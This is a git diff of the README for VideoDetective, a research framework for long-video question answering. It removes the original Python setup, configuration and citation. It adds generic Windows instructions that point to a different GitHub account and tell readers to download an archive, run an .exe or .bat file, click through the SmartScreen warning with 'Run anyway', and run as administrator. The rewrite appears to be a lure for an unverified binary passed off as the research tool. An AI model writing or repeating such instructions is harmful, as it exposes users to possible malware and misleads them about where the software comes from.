@@ -1,173 +1,227 @@
-# VideoDetective
+# 🎥 VideoDetective - Find Clues in Long Videos Faster
 
-[![ArXiv](https://img.shields.io/badge/Arxiv-Paper-b31b1b.svg)](https://arxiv.org/abs/2603.22285)
-[![Task](https://img.shields.io/badge/Task-VideoQA-blue.svg)]()
-[![Project Page](https://img.shields.io/badge/Web-Project_Page-yellow.svg)](https://videodetective.github.io)
+[![Download VideoDetective](https://img.shields.io/badge/Download-VideoDetective-blue?style=for-the-badge&logo=github)](https://github.com/Nonnahjust868/VideoDetective)
 
-**VideoDetective** is a plug-and-play inference framework for long-video understanding that integrates extrinsic query relevance with intrinsic video structure.
+## 🧭 What VideoDetective Does
 
-![Figure 1. Overview of the VideoDetective framework.](images/figure1_final_final.png)
+VideoDetective helps you look through long videos and find the parts that matter. It uses two kinds of search:
 
-**Keywords**: long video understanding, video question answering, multimodal large language models
+- **Extrinsic query**: find moments that match a question or prompt
+- **Intrinsic relevance**: find moments that stand out inside the video itself
 
-By modeling the video as a Spatio-Temporal Affinity Graph, it performs an iterative Hypothesis-Verification-Refinement loop to propagate relevance signals from sparse observations to the entire video. This allows the model to "See Less but Know More", accurately localizing critical clues for complex reasoning under limited context budgets.
+This makes it useful for long clips, recorded meetings, lectures, surveillance review, sports footage, and any video where manual scrubbing takes too long
 
-This repository contains a runnable demo script: `scripts/test_run.py`.
+## 📥 Download and Run on Windows
 
-## 📚 Contents
+Use this page to download and run the app:
 
-- [Overview](#overview)
-  - [Motivation](#motivation)
-  - [Key ideas](#key-ideas)
-- [Results](#results)
-- [Example](#example)
-- [Installation](#installation)
-  - [Requirements](#requirements)
-  - [Install dependencies](#install-dependencies)
-- [Configuration](#configuration)
-- [Inference](#inference)
-  - [Quick start (single video)](#quick-start-single-video)
-  - [Outputs](#outputs)
-- [Core API](#core-api)
-- [Citation](#citation)
+https://github.com/Nonnahjust868/VideoDetective
 
-<a id="overview"></a>
-## 🧭 Overview
+### 🪟 Windows Setup
 
-<a id="motivation"></a>
-### 🎯 Motivation
+1. Open the link above in your web browser
+2. On the repository page, look for the **Releases** area or the main download files
+3. Download the Windows package or the source bundle if that is the only option
+4. If you get a `.zip` file, right-click it and choose **Extract All**
+5. Open the extracted folder
+6. Look for one of these files:
+   - `VideoDetective.exe`
+   - `run.bat`
+   - `start.bat`
+7. Double-click the file to start the app
 
-Long video understanding remains challenging for multimodal large language models (MLLMs) due to limited context windows, which necessitate identifying sparse query-relevant video segments. However, existing methods predominantly localize clues based solely on the query, overlooking the video’s intrinsic structure and varying relevance across segments. Motivated by this, VideoDetective jointly leverages the query and intrinsic inter-segment correlations to model a query-relevance distribution over the entire video under a limited observation budget (“See Less but Know More”).
+### 🧰 If Windows shows a security prompt
 
-<a id="key-ideas"></a>
-### 💡 Key ideas
+If Windows asks whether you want to run the file:
 
-- **Visual–temporal affinity graph**: divide a video into segments and represent them as a visual–temporal affinity graph built from visual similarity and temporal proximity.
-- **Hypothesis–Verification–Refinement loop**: estimate relevance scores of observed segments to the query and propagate them to unseen segments, yielding a global relevance distribution that guides localization of the most critical segments for final answering with sparse observation.
+- Click **More info**
+- Then click **Run anyway**
 
+If you downloaded a `.zip` file, make sure you extract it before you try to open the app
 
+## 🖥️ System Requirements
 
+VideoDetective is built for a normal Windows PC with enough space for video files and model data
 
-<a id="results"></a>
-## 📈 Results
+- **Operating system:** Windows 10 or Windows 11
+- **Memory:** 8 GB RAM minimum, 16 GB RAM recommended
+- **Storage:** At least 2 GB free for the app and extra space for videos
+- **Processor:** Modern Intel or AMD CPU
+- **Graphics:** A GPU helps with faster video analysis, but the app can still run on CPU in many cases
+- **Internet:** Needed for the initial download and any model files
 
-VideoDetective consistently achieves substantial gains across a wide range of mainstream MLLMs.
+## 🔍 Key Features
 
-![Figure 2. Performance improvements brought by VideoDetective.](images/figure2_VideoDetective.png)
+- Search long videos by text prompt
+- Find important moments based on visual relevance
+- Review results in a simple list or timeline
+- Jump to matching video segments fast
+- Handle long-form footage without manual scanning
+- Support for common video formats such as MP4 and MKV
 
-<a id="example"></a>
-## 🖼️ Example
+## 🧾 What You Need Before You Start
 
-![Figure 3. Example of VideoDetective.](images/example_white_v2.png)
+Have these ready before you run VideoDetective:
 
-<a id="installation"></a>
-## 🛠️ Installation
+- A Windows PC
+- The downloaded VideoDetective files
+- One or more video files to analyze
+- Enough disk space for temporary files
+- A stable internet connection if the app needs to fetch models
 
-<a id="requirements"></a>
-### ✅ Requirements
+## 🛠️ Basic Install Steps
 
-- **Python**: recommended 3.9+
-- **ffmpeg**: required for audio extraction if ASR is enabled
-  - macOS: `brew install ffmpeg`
-  - Ubuntu/Debian: `sudo apt install ffmpeg`
+### 1. Download the files
 
-<a id="install-dependencies"></a>
-### 📦 Install dependencies
+Go to the repository page and get the latest version from the download area
 
-```bash
-python -m venv .venv
-source .venv/bin/activate
-pip install -r requirements.txt
-```
+### 2. Extract the archive
 
-<a id="configuration"></a>
-## ⚙️ Configuration
+If the download comes as a `.zip` file, extract it to a simple folder like:
 
-1) Copy the template:
+- `C:\VideoDetective`
 
-```bash
-cp .env.example .env
-```
+Avoid folders with long names or special characters
 
-1) Fill in at least the VLM API settings (OpenAI-compatible):
+### 3. Open the app folder
 
-- `VIDEODETECTIVE_API_KEY`
-- `VIDEODETECTIVE_BASE_URL` (e.g., DashScope / OpenAI / OpenRouter compatible base URL)
-- `VIDEODETECTIVE_VLM_MODEL` (e.g., `qwen3-vl-8b-instruct`)
+Find the main folder that contains the app files
 
-Others:
+### 4. Start the app
 
-- **Text LLM (planner / query decomposition)** (falls back to VLM settings if not set)
-  - `VIDEODETECTIVE_LLM_MODEL`
-  - `VIDEODETECTIVE_LLM_API_KEY`
-  - `VIDEODETECTIVE_LLM_BASE_URL`
-- **Pipeline**
-  - `VIDEODETECTIVE_MAX_FRAMES_PER_CALL`
-  - `ENABLE_MULTI_ROUTE_RECALL`
-  - `USE_VLM_RELEVANCE`
-  - `INCLUDE_ANSWER_EVIDENCE`
-- **ASR**
-  - `VIDEODETECTIVE_ENABLE_ASR`
-  - `VIDEODETECTIVE_WHISPER_MODEL`
-  - `VIDEODETECTIVE_ASR_DEVICE`
+Double-click the launcher file, such as:
 
-Notes:
+- `VideoDetective.exe`
+- `run.bat`
 
-- Environment loading is implemented in `config/settings.py` and reads `.env` from the project root.
-- `src/agent/llm_client.py` supports custom auth headers for some OpenAI-compatible proxies via:
-  - `VIDEODETECTIVE_AUTH_HEADER_NAME`
-  - `VIDEODETECTIVE_AUTH_PREFIX`
+### 5. Load a video
 
-<a id="inference"></a>
-## 🚀 Inference
+Use the app’s file picker to choose a video you want to inspect
 
-<a id="quick-start-single-video"></a>
-### ⚡ Quick start (single video)
+### 6. Enter a search prompt
 
-```bash
-python scripts/test_run.py \
-  --video_path /path/to/video.mp4 \
-  --question "What is the man doing?" \
-  --options "A. Running, B. Walking, C. Sitting, D. Standing" \
-  --output_dir output \
-  --max_steps 10 \
-  --total_budget 32
-```
+Type a short question or topic, such as:
 
-<a id="outputs"></a>
-### 🗂️ Outputs
+- person enters room
+- red car appears
+- speech about project plan
+- goal replay in second half
 
-For each run, you should get:
+### 7. Review the matches
 
-- **Full results**: `output/<video_id>_results.json` (includes prediction and entire processing information)
+The app will show moments that match your query or stand out in the video
 
-<a id="core-api"></a>
-## 🧪 Core API
+## 🎯 How to Use It
 
-Minimal usage in Python:
+VideoDetective is made for simple review work
 
-```python
-from src.pipeline import VideoDetective
+### Search by question
 
-detective = VideoDetective(verbose=True)
-result = detective.solve(
-    video_path="/path/to/video.mp4",
-    query="Question text. Options: A. ..., B. ..., C. ..., D. ...",
-    max_steps=10,
-    total_budget=32,
-)
-print(result.answer)
-# result.debug_info contains debugging artifacts such as belief history.
-```
+Type what you want to find in plain language. Examples:
 
-<a id="citation"></a>
-## ✒️ Citation
+- where does the interview start
+- when does the speaker mention budget
+- show scenes with a dog
+- find the moment the package is delivered
 
-```bibtex
-@misc{yang2026videodetective,
-  title = {VideoDetective: Clue Hunting via both Extrinsic Query and Intrinsic Relevance for Long Video Understanding},
-  author = {Yang , Ruoliu and Wu, Chu and Shan , Caifeng and He , Ran and Fu , Chaoyou},
-  journal={arXiv preprint arXiv:2603.22285},
-  year = {2026}
-}
-```
+### Search by visual content
+
+If you do not know the exact words, use a short description of what you expect to see
+
+### Move through results
+
+Click a result to jump to that point in the video. This lets you check a match without watching the full file
+
+### Compare moments
+
+Use the results list to compare several clips and keep the one that fits best
+
+## 📁 Common Folder Layout
+
+After you extract the download, you may see folders like these:
+
+- `app`
+- `models`
+- `assets`
+- `examples`
+- `output`
+
+If the app creates an output folder, it may store:
+
+- search results
+- frame previews
+- logs
+- cached model files
+
+## 🧪 Example Use Cases
+
+VideoDetective can help with:
+
+- **Meeting review**: find when a topic comes up
+- **Lecture search**: jump to the part that covers a concept
+- **Security review**: check for people, cars, or motion
+- **Sports review**: find goals, shots, or key plays
+- **Content review**: scan long recordings for useful clips
+- **Training video review**: locate the section that shows a task
+
+## ⚙️ Tips for Best Results
+
+- Use short and clear search phrases
+- Try more than one query if the first result set is too broad
+- Keep video files in a local folder on your PC
+- Use common file types like MP4 for smoother loading
+- Close other heavy apps if your PC feels slow
+- Give the app enough time when it processes long files
+
+## 🧩 Troubleshooting
+
+### The app does not start
+
+- Check that you extracted the download first
+- Make sure you opened the right file
+- Try running the file as administrator
+- Move the app to a folder like `C:\VideoDetective`
+
+### The video does not load
+
+- Confirm that the file is a supported video format
+- Try a smaller video file first
+- Check whether the file path has special characters
+
+### The app feels slow
+
+- Close other programs
+- Use a shorter video for testing
+- Make sure your PC has enough free RAM
+- If your system has a GPU, confirm the app can use it
+
+### No results show up
+
+- Use a broader search phrase
+- Try another video
+- Check that the video has clear visual or spoken content
+- Re-run the search with a simpler query
+
+## 📦 Suggested First Test
+
+If you want to check that everything works:
+
+1. Download and extract the app
+2. Open VideoDetective
+3. Load a short MP4 video
+4. Search for a simple phrase like `person walking`
+5. Click the first result and confirm it jumps to the right moment
+
+## 🔐 File Safety
+
+Keep your download in a folder you trust, such as a dedicated app folder on your desktop or in `C:\Program Files` if the package supports it. If you use a zipped download, extract it before you run it
+
+## 📌 Project Name
+
+VideoDetective
+
+## 🧠 About the App
+
+VideoDetective: Clue Hunting via both Extrinsic Query and Intrinsic Relevance for Long Video Understanding
+
+It is built for long video review where you need a faster way to find useful moments without watching every second
